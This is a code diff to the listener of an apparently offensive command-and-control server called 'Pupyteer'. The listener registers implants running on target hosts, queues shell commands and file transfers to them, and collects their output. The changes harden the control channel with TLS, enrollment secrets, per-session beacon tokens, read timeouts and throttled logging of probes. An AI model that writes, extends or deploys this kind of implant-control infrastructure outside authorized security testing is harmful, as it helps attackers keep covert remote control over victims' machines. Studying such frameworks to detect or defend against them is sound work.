@@ -4,7 +4,8 @@ Provides the core C2 server transport: accepts inbound TCP connections
 from Pupyteer agents, performs session registration, dispatches queued
 command on check-in, and collects command output.
 
-Protocol: newline-delimited JSON messages over a plain TCP socket.
+Protocol: newline-delimited JSON messages over one TCP connection per session,
+wrapped in TLS when the config supplies an ``ssl_context`` (server.tls).
 
 Transport encryption is OPTIONAL. When the listener is constructed with a
 ``rc4_key`` (hex string) in its config, every inbound frame is RC4-decrypted
@@ -17,24 +18,21 @@ for the framing; see the WIRE FORMAT comment atop ``pe_template.c``.
 Message types:
     Agent → Server:
         {"type": "register", "hostname": "...", "os": "...", "arch": "...",
-         "username": "...", "agent_version": "...", "agent_id": "...",
-         "signature": "<hex ed25519 sig over nonce>"}
-        {"type": "checkin", "session_id": "..."}
+         "username": "...", "agent_version": "...", "auth": "<enrollment secret>",
+         "capabilities": ["exec", "fs_get", ...], "max_line": 65536}
+        {"type": "checkin", "session_id": "...", "beacon": "<beacon token>"}
         {"type": "output", "session_id": "...", "command_id": "...",
-         "output": "..."}
+         "output": "...", "beacon": "<beacon token>"}
 
     Server → Agent:
-        {"type": "challenge", "nonce": "<hex>"}
-        {"type": "registered", "session_id": "..."}
+        {"type": "registered", "session_id": "...", "beacon_token": "..."}
         {"type": "commands", "commands": [{"command_id": "...", "command": "..."}]}
         {"type": "ack"}
         {"type": "error", "message": "..."}
 
-Registration is authenticated with a per-agent Ed25519 keypair (see
-``pupyteer.server.core.agent_keys``). On ``register`` the listener issues a
-nonce via ``challenge``; the agent signs it and the server verifies against
-the pubkey registry before creating a session. Unknown or unsigned agents are
-dropped — closing the unauthenticated-session hole.
+``auth`` says a payload may become a session and is checked only at ``register``;
+``beacon`` says a message speaks for the session it names, and is checked on every
+one that does. A token is handed out once, in the ``registered`` reply.
 """
 from __future__ import annotations
 
@@ -43,12 +41,45 @@ import json
 import logging
 import time
 import uuid
-from typing import Any, Dict, Optional
+from typing import Any, Dict, List, Optional
 
+from pupyteer.server.core.enrollment import beacon_accepts, new_beacon_token
 from pupyteer.server.core.logging import AuditLogger
+from pupyteer.server.sessions.capabilities import (
+    declared_capabilities, declared_max_line,
+)
 from pupyteer.server.sessions.manager import SessionInfo
 
 logger = logging.getLogger("pupyteer.transports.listener")
+
+# asyncio's StreamReader defaults to 64 KiB per line, which a file-transfer
+# chunk or a long command output blows straight through — readline() then raises
+# and the session dies. Message framing is one JSON object per line, so the
+# ceiling has to be above the largest payload an operator can ask for.
+MAX_MESSAGE_BYTES = 32 * 1024 * 1024
+
+# How long a peer may take to finish a TLS handshake before the connection is
+# dropped. A host that cannot complete one is not going to start halfway through,
+# and every second it holds this socket is a second of queue on the listener.
+HANDSHAKE_TIMEOUT_SECONDS = 10.0
+
+# How long an established connection may stay silent — no complete message line —
+# before it is torn down. Without it a stalled or slowloris peer that opens a
+# socket and dribbles bytes without ever finishing a line holds an asyncio task
+# and a socket open forever. A ``readline()`` with no deadline is exactly that
+# hang. The default is generous enough that a normally beaconing agent never
+# trips it (a dropped connection simply re-registers, the recovery already coded
+# for in _handle_checkin), while still bounding a hostile idle. Overridable per
+# listener through ``config["idle_timeout"]`` (seconds), which is what the tests
+# use to exercise the path quickly.
+IDLE_READ_TIMEOUT_SECONDS = 300.0
+
+# One line per refusal is what an operator needs the first time a payload fails to
+# call back; it is also an invitation to bury the entries that matter, because the
+# audit log rotates at a fixed size and drops the oldest. So refusals of every kind
+# are counted exactly and reported per key at most this often.
+REFUSAL_REPORT_WINDOW_SECONDS = 60.0
+_REFUSAL_REPORT_KEYS = 4096
 
 
 class PendingCommand:
@@ -107,6 +138,15 @@ class AgentListener:
     ):
         self._host: str = config.get("host", "0.0.0.0")
         self._port: int = int(config.get("port", 8443))
+        # Supplied by TransportManager when server.tls is on. Absent means the
+        # listener speaks plaintext JSON, which any tap on the wire can read.
+        self._ssl_context = config.get("ssl_context")
+        # Supplied by TransportManager: the enrollment file a register message has
+        # to match a line of. Consulted per registration rather than resolved once
+        # here, so an operator who deletes a secret stops it working without having
+        # to restart the server and drop every session in the dashboard. None
+        # disables the check, which is what server.agent_auth: false asks for.
+        self._enrollment = config.get("enrollment")
         self._session_manager = session_manager
         self._audit = audit_logger
         # AgentKeyRegistry for Ed25519 registration verification. If None,
@@ -143,8 +183,20 @@ class AgentListener:
             # handler (reset on each new connection).
             self._rc4_buf = bytearray()
 
+        # Maximum silence tolerated per read on an established connection; see
+        # IDLE_READ_TIMEOUT_SECONDS. Overridable so a stalled-read test does not
+        # have to wait five minutes.
+        self._idle_timeout = float(
+            config.get("idle_timeout", IDLE_READ_TIMEOUT_SECONDS))
+
         self._server: Optional[asyncio.base_events.Server] = None
         self._connections: Dict[str, ConnectionState] = {}  # session_id → state
+        # Every in-flight _handle_client coroutine, tracked so stop() can cancel
+        # them — including the ones that never registered a session and so are
+        # not in _connections (a stalled handshake or a slowloris read). asyncio
+        # runs the start_server callback as a task and keeps no reference, so
+        # without tracking these the socket is left orphaned on teardown.
+        self._handler_tasks: set = set()
         self._lock = asyncio.Lock()
         self._stats: Dict[str, int] = {
             "connections": 0,
@@ -152,7 +204,29 @@ class AgentListener:
             "bytes_received": 0,
             "sessions_created": 0,
             "commands_dispatched": 0,
+            # Counted separately from connections: "lots of connections, no
+            # sessions" is what someone probing the listener looks like.
+            "registrations_rejected": 0,
+            # A message that named a session it cannot prove it owns. Distinct
+            # from registrations_rejected because the shape it means is different:
+            # that one is a stranger at the port, this one is someone who already
+            # knows a session id and is trying to speak for it.
+            "beacons_refused": 0,
+            # Connections that never became a request line. On a TLS listener
+            # this is what a payload built while server.tls was off looks like:
+            # without it, a stranded implant and a powered-off host are the
+            # same number — zero — and nothing points at the rebuild.
+            "handshakes_refused": 0,
         }
+        # Refusals leave a trace line at most once a window per key; see
+        # _thin_report. Handshake refusals key on the peer, beacon refusals on
+        # peer+session: someone poking at session ids is as loud as a port sweep,
+        # and has the same power to push the entries an operator cares about out of
+        # an audit file that rotates. Dict order is the order a key was last
+        # reported in, which is what lets the cap drop the stalest key rather than
+        # a random one.
+        self._handshake_reports: Dict[str, List[float]] = {}
+        self._beacon_reports: Dict[str, List[float]] = {}
 
     # ------------------------------------------------------------------
     #  Lifecycle
@@ -160,21 +234,182 @@ class AgentListener:
 
     async def start(self) -> None:
         """Bind the TCP server and start accepting connections."""
+        ssl_context = self._ssl_context
+        # The upgrade happens per connection in _upgrade_tls rather than by
+        # handing ssl= to start_server, so that a failed handshake is something
+        # this listener can see. asyncio reports those to the event loop's
+        # exception handler and closes the socket, which leaves the operator
+        # with a port that is "not getting any sessions".
         self._server = await asyncio.start_server(
             self._handle_client,
             host=self._host,
             port=self._port,
+            limit=MAX_MESSAGE_BYTES,
         )
         addrs = ", ".join(str(s.getsockname()) for s in self._server.sockets)
-        logger.info("Agent listener listening on %s", addrs)
+        logger.info("Agent listener listening on %s (%s)",
+                    addrs, "TLS" if ssl_context else "plaintext")
         self._audit.log_event("listener_started", {
             "host": self._host,
             "port": self._port,
+            "tls": bool(ssl_context),
         })
+
+    async def _upgrade_tls(
+        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
+    ) -> bool:
+        """Wrap this connection in TLS, or say why it could not be wrapped.
+
+        Returns False when the connection must be dropped: the peer did not
+        speak TLS to a TLS listener, or the handshake went wrong. Never returns
+        False on a listener that has no certificate — that one is plaintext by
+        configuration, and the caller proceeds.
+        """
+        if self._ssl_context is None:
+            return True
+        peer = writer.get_extra_info("peername") or ("unknown", 0)
+        peer_key = f"{peer[0]}:{peer[1]}"
+        try:
+            await writer.start_tls(
+                self._ssl_context, ssl_handshake_timeout=HANDSHAKE_TIMEOUT_SECONDS)
+            return True
+        except Exception as exc:
+            self._stats["handshakes_refused"] += 1
+            self._report_handshake_refusal(peer_key, f"{type(exc).__name__}: {exc}")
+            return False
+
+    def _thin_report(self, reports: Dict[str, List[float]], key: str) -> Optional[int]:
+        """Decide whether this key earns a trace line now, or is folded into the next.
+
+        Returns None when the last line for this key is still inside the window —
+        the count has been incremented and nothing more is written — and the number
+        of refusals suppressed since the line before otherwise. Counts stay exact
+        either way; this only governs how much of them reaches the log and the
+        rotating audit file, where a stranger's noise must not evict what an
+        operator is looking for.
+        """
+        now = time.monotonic()
+        record = reports.get(key)
+        if record is None:
+            if len(reports) >= _REFUSAL_REPORT_KEYS:
+                reports.pop(next(iter(reports)))
+            reports[key] = [now, 0.0]
+            return 0
+        if now - record[0] >= REFUSAL_REPORT_WINDOW_SECONDS:
+            record[0] = now
+            suppressed = int(record[1])
+            record[1] = 0.0
+            return suppressed
+        record[1] += 1
+        return None
+
+    def _report_handshake_refusal(self, peer_key: str, reason: str) -> None:
+        """Report a refused handshake, at most once a window per peer.
+
+        ``handshakes_refused`` is the exact live total and ``transports list`` is
+        where an operator reads it; this is the durable trace left beside it. It
+        is thinned per peer so that a port sweep cannot use this event to push
+        the entries that matter out of an audit file that rotates. Each line
+        names the peer and the reason, ``count`` is the listener-wide total when
+        it was written, and ``suppressed`` is what this peer did in between two
+        lines, which would otherwise be invisible.
+        """
+        suppressed = self._thin_report(self._handshake_reports, peer_key)
+        if suppressed is None:
+            return
+
+        logger.warning("TLS handshake failed from %s: %s (%d more from this peer "
+                       "since the last line)", peer_key, reason[:200], suppressed)
+        self._audit.log_event(
+            "handshake_refused",
+            {"peer": peer_key, "reason": reason[:200],
+             "count": self._stats["handshakes_refused"],
+             "suppressed": suppressed},
+            result="error",
+        )
+
+    def _refuse_beacon(
+        self,
+        remote: str,
+        session_id: str,
+        presented: Any,
+        verb: str,
+    ) -> Dict[str, Any]:
+        """Record a beacon that named a session it cannot prove it owns.
+
+        Returns the reply the caller must send. An agent reads a refusal as a lost
+        session and registers again, which is the right recovery for a server that
+        restarted without it — and all an older payload can do, so what an operator
+        sees is a session that reappears every beacon interval while
+        ``beacons_refused`` climbs. The fix then is a rebuild, not a re-try: this
+        is not a channel to be worked around, it is a proof the payload lacks.
+        """
+        self._stats["beacons_refused"] += 1
+        suppressed = self._thin_report(
+            self._beacon_reports, f"{remote}|{session_id}")
+        if suppressed is None:
+            return {"type": "error", "message": "beacon_auth_failed"}
+
+        logger.warning(
+            "Refused %s for session %s from %s: beacon token %s "
+            "(%d more like it since the last line)",
+            verb, session_id[:40], remote,
+            "absent" if not presented else "wrong", suppressed)
+        self._audit.log_event(
+            "beacon_refused",
+            {"peer": remote, "session_id": session_id, "verb": verb,
+             "reason": "bad_beacon_token",
+             "count": self._stats["beacons_refused"],
+             "suppressed": suppressed},
+            result="error",
+        )
+        return {"type": "error", "message": "beacon_auth_failed"}
+
+    def _track_current_handler(self) -> None:
+        """Register the running _handle_client task so stop() can cancel it.
+
+        Called at the very top of each connection handler, before the socket is
+        read or a session is registered, so a peer that never gets that far is
+        still accounted for. Completed handlers drop themselves via the callback.
+        """
+        task = asyncio.current_task()
+        if task is not None:
+            self._handler_tasks.add(task)
+            task.add_done_callback(self._handler_tasks.discard)
+
+    async def _cancel_handler_tasks(self) -> None:
+        """Cancel every in-flight connection handler and wait for it to unwind.
+
+        Closing _connections only reaches sockets that registered a session; the
+        handlers still inside a handshake or a stalled first read are cancelled
+        here so teardown does not orphan them.
+        """
+        tasks = [t for t in self._handler_tasks if not t.done()]
+        for task in tasks:
+            task.cancel()
+        if tasks:
+            await asyncio.gather(*tasks, return_exceptions=True)
+        self._handler_tasks.clear()
 
     async def stop(self) -> None:
         """Gracefully close the server and all active connections."""
-        # Close every active connection first
+        # Stop accepting new connections first; close() does not wait.
+        if self._server is not None:
+            self._server.close()
+
+        # Cancel in-flight handlers BEFORE waiting for the server to finish. On
+        # Python 3.12+ ``Server.wait_closed()`` blocks until every active
+        # connection task ends, so a handler parked on a stalled read would hang
+        # teardown forever — and a handler that never registered a session is
+        # absent from _connections, so closing those alone leaves it orphaned.
+        # This is the cleanup that missing wait_closed() behaviour made fatal.
+        await self._cancel_handler_tasks()
+
+        if self._server is not None:
+            await self._server.wait_closed()
+            self._server = None
+
+        # Close any connection writers still held by registered sessions.
         async with self._lock:
             for sid, conn in list(self._connections.items()):
                 try:
@@ -183,11 +418,6 @@ class AgentListener:
                 except Exception:
                     pass
             self._connections.clear()
-
-        if self._server is not None:
-            self._server.close()
-            await self._server.wait_closed()
-            self._server = None
 
         logger.info("Agent listener stopped on %s:%d", self._host, self._port)
         self._audit.log_event("listener_stopped", {
@@ -215,6 +445,16 @@ class AgentListener:
         addr = writer.get_extra_info("peername") or ("unknown", 0)
         remote_str = f"{addr[0]}:{addr[1]}"
         session_id: Optional[str] = None
+
+        # Accounted for before the first read, so a peer that never completes a
+        # handshake or a first line is still cancelled cleanly on stop().
+        self._track_current_handler()
+
+        # Before anything is read, so a peer that cannot speak TLS to a TLS
+        # listener is refused as a handshake and not as malformed JSON.
+        if not await self._upgrade_tls(reader, writer):
+            await self._drop(writer)
+            return
 
         logger.debug("New agent connection from %s", remote_str)
         self._stats["connections"] += 1
@@ -257,7 +497,16 @@ class AgentListener:
                     continue
 
                 try:
-                    line = await reader.readline()
+                    # A deadline on the read so a stalled or slowloris peer that
+                    # never finishes a line cannot hold this task and socket open
+                    # forever. EOF and a completed line both fall through.
+                    line = await asyncio.wait_for(
+                        reader.readline(), timeout=self._idle_timeout)
+                except asyncio.TimeoutError:
+                    logger.info(
+                        "Dropping idle connection from %s: no complete message in "
+                        "%.0fs", remote_str, self._idle_timeout)
+                    break
                 except (ConnectionError, OSError):
                     break
 
@@ -305,6 +554,15 @@ class AgentListener:
                 await writer.wait_closed()
             except Exception:
                 pass
+
+    @staticmethod
+    async def _drop(writer: asyncio.StreamWriter) -> None:
+        """Close a connection without ceremony; it is already going away."""
+        try:
+            writer.close()
+            await writer.wait_closed()
+        except Exception:
+            pass
 
     # ------------------------------------------------------------------
     #  Message dispatch
@@ -447,9 +705,9 @@ class AgentListener:
         if msg_type == "register":
             return await self._handle_register(msg, remote, writer)
         if msg_type == "checkin":
-            return await self._handle_checkin(msg, writer)
+            return await self._handle_checkin(msg, remote, writer)
         if msg_type == "output":
-            return await self._handle_output(msg)
+            return await self._handle_output(msg, remote)
 
         logger.warning("Unknown message type '%s' from %s", msg_type, remote)
         return {"type": "error", "message": f"unknown_type: {msg_type}"}
@@ -542,6 +800,34 @@ class AgentListener:
         agent_id: Optional[str],
     ) -> Dict[str, Any]:
         """Create + register a SessionInfo for an authenticated agent."""
+        ledger = self._enrollment
+        if ledger is not None and not ledger.accepts(msg.get("auth")):
+            # Deliberately before anything is created: a session is a handler an
+            # operator can run commands through and push files to, so a stranger
+            # must not be able to conjure one by reaching the port.
+            self._stats["registrations_rejected"] += 1
+            if not ledger.accepted():
+                # Says something different from "wrong secret": here the server
+                # is the one that cannot present a credential, and no payload
+                # built against anything will get in until it is fixed.
+                why = "accepting no enrollment secret at all"
+            elif not msg.get("auth"):
+                why = "absent"
+            else:
+                why = "wrong"
+            logger.warning("Rejected registration from %s: enrollment secret %s",
+                           remote, why)
+            self._audit.log_event(
+                "registration_rejected",
+                {
+                    "remote_address": remote,
+                    "claimed_hostname": str(msg.get("hostname", ""))[:120],
+                    "reason": "bad_enrollment_secret",
+                },
+                result="error",
+            )
+            return {"type": "error", "message": "auth_failed"}
+
         session_id = str(uuid.uuid4())[:12]
 
         info = SessionInfo(
@@ -552,6 +838,18 @@ class AgentListener:
             username=msg.get("username", "unknown"),
             agent_version=msg.get("agent_version", "unknown"),
             remote_address=remote,
+            # What the payload says it carries, not what this build shipped: a
+            # session is created from this message and nothing else, so the only
+            # account of the binary on the target is the one the binary gives.
+            # A payload built before either field existed declares neither, and is
+            # left with shell commands and no structured tasking.
+            capabilities=declared_capabilities(msg.get("capabilities")),
+            max_line=(declared_max_line(msg.get("max_line"))
+                      if msg.get("max_line") else 0),
+            # Handed out once, in the reply below, and never shown to an operator.
+            # Everything after this line has to bring it back or it is a stranger
+            # wearing a session id.
+            beacon_token=new_beacon_token(),
         )
 
         registered_id = await self._session_manager.register(info)
@@ -578,6 +876,9 @@ class AgentListener:
                 "arch": info.arch,
                 "username": info.username,
                 "remote_address": remote,
+                # What was deployed is a question the report asks eventually, and
+                # this is the only moment anyone records the payload's own answer.
+                "capabilities": list(info.capabilities),
             },
             session=registered_id,
         )
@@ -586,7 +887,11 @@ class AgentListener:
             registered_id, agent_id, info.username, info.hostname, remote,
         )
 
-        return {"type": "registered", "session_id": registered_id}
+        return {
+            "type": "registered",
+            "session_id": registered_id,
+            "beacon_token": info.beacon_token,
+        }
 
     # ------------------------------------------------------------------
     #  Check-in
@@ -595,22 +900,29 @@ class AgentListener:
     async def _handle_checkin(
         self,
         msg: Dict[str, Any],
+        remote: str,
         writer: asyncio.StreamWriter,
     ) -> Dict[str, Any]:
         """Return queued commands for the session and bump last_checkin."""
         session_id = msg.get("session_id", "")
 
-        # Reject check-ins on sessions that never authenticated (only possible
-        # when running in legacy unsigned mode — still guarded defensively).
-        async with self._lock:
-            conn = self._connections.get(session_id)
-        if conn is not None and not conn.authenticated:
-            self._audit.log_event(
-                "agent_auth_rejected",
-                {"session_id": session_id, "reason": "unauthenticated_checkin"},
-                result="denied",
-            )
-            return {"type": "error", "message": "unauthenticated"}
+        info = await self._session_manager.get(session_id)
+
+        # An unknown session means the operator's side lost it — a team-server
+        # restart, or a session killed while the agent kept beaconing. Answering
+        # "no commands" forever leaves a live agent attached to a dead session
+        # that no operator can address, so tell it to register again. Kept
+        # distinct from a refused beacon because the two have different fixes: one
+        # is a re-register, the other is a rebuild.
+        if info is None:
+            logger.info("Check-in for unknown session %s; telling agent to re-register", session_id)
+            return {"type": "error", "message": "unknown_session"}
+
+        # Before the heartbeat, before the queue is read. A beacon that cannot say
+        # whose session it is gets nothing, and does not get to look alive either:
+        # last_checkin is how an operator decides a host is still there.
+        if not beacon_accepts(info.beacon_token, msg.get("beacon")):
+            return self._refuse_beacon(remote, session_id, msg.get("beacon"), "checkin")
 
         # Update heartbeat
         await self._session_manager.update_checkin(session_id)
@@ -628,6 +940,13 @@ class AgentListener:
 
         commands = []
         for cmd in pending:
+            # Queued only. A command the queue already answered — a refusal the
+            # implant could not have carried — has no business going down the
+            # wire, and handing it out here would overwrite the answer with
+            # "delivered" and leave the operator waiting on output that was
+            # written before the request ever existed.
+            if cmd.get("status") != "queued":
+                continue
             commands.append({
                 "command_id": cmd["command_id"],
                 "command": cmd["command"],
@@ -649,11 +968,25 @@ class AgentListener:
     #  Output
     # ------------------------------------------------------------------
 
-    async def _handle_output(self, msg: Dict[str, Any]) -> Dict[str, Any]:
+    async def _handle_output(
+        self, msg: Dict[str, Any], remote: str
+    ) -> Dict[str, Any]:
         """Resolve a pending command with its output."""
         session_id = msg.get("session_id", "")
         command_id = msg.get("command_id", "")
         output = msg.get("output", "")
+
+        info = await self._session_manager.get(session_id)
+        if info is None:
+            # ack_command would answer {"type":"ack"} for a session that has never
+            # existed, and the audit line below would say a command was completed by
+            # a session id the operator can name. That is a forged result with the
+            # look of a real one, so it stops here.
+            logger.info("Output for unknown session %s; dropped", session_id)
+            return {"type": "error", "message": "unknown_session"}
+
+        if not beacon_accepts(info.beacon_token, msg.get("beacon")):
+            return self._refuse_beacon(remote, session_id, msg.get("beacon"), "output")
 
         await self._session_manager.ack_command(session_id, command_id, output)
 
